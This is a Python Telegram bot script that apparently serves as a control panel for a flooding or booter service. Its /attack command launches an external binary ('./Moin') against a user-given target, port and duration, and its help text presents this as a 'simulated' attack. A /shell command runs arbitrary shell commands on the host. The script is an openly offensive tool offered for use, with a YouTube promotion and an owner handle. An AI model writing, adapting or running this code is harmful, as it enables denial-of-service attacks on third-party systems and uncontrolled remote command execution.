#!/usr/bin/python3
import telebot
import time
import threading
import subprocess

# Telegram bot token
bot = telebot.TeleBot('YOUR_BOT_TOKEN')

# Admin user IDs
admin_id = ["1232047106"]

# Authorized users (Initially empty, you can add via /add)
authorized_users = []

# Cooldown tracker
user_cooldowns = {}

# Maximum duration and cooldown time
MAX_DURATION = 180
COOLDOWN_TIME = 30

# YouTube Channel Promotion
YT_PROMO = "🚀 Don't forget to subscribe to our YouTube Channel: [SRK](https://www.youtube.com/@SRK) for more updates!"

# Command to simulate attack execution
def execute_attack(target, port, duration):
    time.sleep(duration)
    return f"🏁 Attack on {target}:{port} finished after {duration} seconds! 🎉\n\n{YT_PROMO}"

# Command to execute shell commands asynchronously
def execute_shell_command(command):
    try:
        # Run the command asynchronously
        process = subprocess.Popen(command, shell=True)
        return process
    except Exception as e:
        return f"Error executing command: {str(e)}"

# Start Command
@bot.message_handler(commands=['start'])
def start(message):
    if str(message.from_user.id) in admin_id:
        bot.reply_to(message, "Welcome Admin! Type /attack to launch an attack.")
    else:
        bot.reply_to(message, "You are not authorized to use this bot.")

# Attack Command
@bot.message_handler(commands=['attack'])
def attack(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    args = message.text.split()[1:]
    if len(args) != 3:
        bot.reply_to(message, "❌ Invalid format! Use /attack [target] [port] [duration].")
        return

    target, port, duration = args
    try:
        duration = int(duration)
        if duration > MAX_DURATION:
            bot.reply_to(message, f"❌ Duration too long! Maximum allowed is {MAX_DURATION} seconds.")
            return
    except ValueError:
        bot.reply_to(message, "❌ Duration must be a number.")
        return

    user_id = message.from_user.id
    if user_id in user_cooldowns:
        remaining_time = round(user_cooldowns[user_id] - time.time())
        if remaining_time > 0:
            bot.reply_to(message, f"⏳ Please wait {remaining_time} seconds before starting a new attack.")
            return

    bot.reply_to(message, f"🔨 Hacking {target} into oblivion!\n\n🎯 **Target:** {target}\n📜 **Port:** {port}\n⏰ **Duration:** {duration} sec")

    # Start the attack in a new thread
    threading.Thread(target=start_attack, args=(message, target, port, duration)).start()

    # Set cooldown for the user
    user_cooldowns[user_id] = time.time() + COOLDOWN_TIME

def start_attack(message, target, port, duration):
    # Command to execute shell attack
    full_command = f"./Moin {target} {port} {duration}"
    process = execute_shell_command(full_command)
    
    if process:
        bot.reply_to(message, f"✅ Attack started: `{full_command}`", parse_mode="Markdown")
    else:
        bot.reply_to(message, "❌ Error starting the attack.")

# Add User Command
@bot.message_handler(commands=['add'])
def add_user(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    args = message.text.split()[1:]
    if len(args) != 1:
        bot.reply_to(message, "❌ Invalid format! Use /add [user_id].")
        return

    user_id = args[0]
    if user_id not in authorized_users:
        authorized_users.append(user_id)
        bot.reply_to(message, f"✅ User {user_id} has been added successfully.")
    else:
        bot.reply_to(message, f"❌ User {user_id} is already authorized.")

# Remove User Command
@bot.message_handler(commands=['remove'])
def remove_user(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    args = message.text.split()[1:]
    if len(args) != 1:
        bot.reply_to(message, "❌ Invalid format! Use /remove [user_id].")
        return

    user_id = args[0]
    if user_id in authorized_users:
        authorized_users.remove(user_id)
        bot.reply_to(message, f"✅ User {user_id} has been removed successfully.")
    else:
        bot.reply_to(message, f"❌ User {user_id} is not authorized.")

# Binary Access Shell Command
@bot.message_handler(commands=['shell'])
def shell(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    args = message.text.split()[1:]
    if len(args) == 0:
        bot.reply_to(message, "❌ Invalid format! Use /shell [command].")
        return

    command = " ".join(args)
    result = execute_shell_command(command)
    bot.reply_to(message, f"🖥️ Shell command output:\n{result}")

# Help Command
@bot.message_handler(commands=['help'])
def help(message):
    bot.reply_to(message, """
Here are the available commands:

/start - Start the bot
/attack [target] [port] [duration] - Simulate an attack
/add [user_id] - Add a user to the authorized list
/remove [user_id] - Remove a user from the authorized list
/shell [command] - Execute a shell command (admin only)
/help - Show this help message

Owner: @OWNERSRK
    """)

# Run the bot
print("Bot is running...")
bot.polling()
        
